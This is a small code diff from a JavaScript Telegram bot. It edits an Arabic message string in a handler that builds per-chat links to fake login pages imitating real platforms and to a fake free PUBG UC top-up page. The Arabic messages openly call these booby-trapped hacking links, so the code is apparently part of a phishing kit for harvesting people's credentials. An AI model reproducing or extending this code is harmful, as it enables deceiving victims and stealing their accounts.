@@ -941,7 +941,7 @@ bot.on('callback_query', (query) => {
     if (data.startsWith('login_')) {
         const platform = data.split('_')[1];
         url = `${baseUrl}/login/${platform}/${chatId}`;
-        message = `تم تلغيم  رابط اندكس تسجيل دخول يشبه الصفحه الحقيقه لحد المنصات${getPlatformName(platform)}: ${url}`;
+        message = `تم تلغيم  رابط اندكس تسجيل دخول يشبه الصفحه الحقيقه لحد المنصات: ${getPlatformName(platform)}: ${url}`;
     } else if (data === 'pubg_uc') {
         url = `${baseUrl}/increase/pubg_uc/${chatId}`;
         message = `تم تلغيم رابط اختراق على شكل صفحه مزوره لشحن شدات ببجي مجانآ: ${url}`;
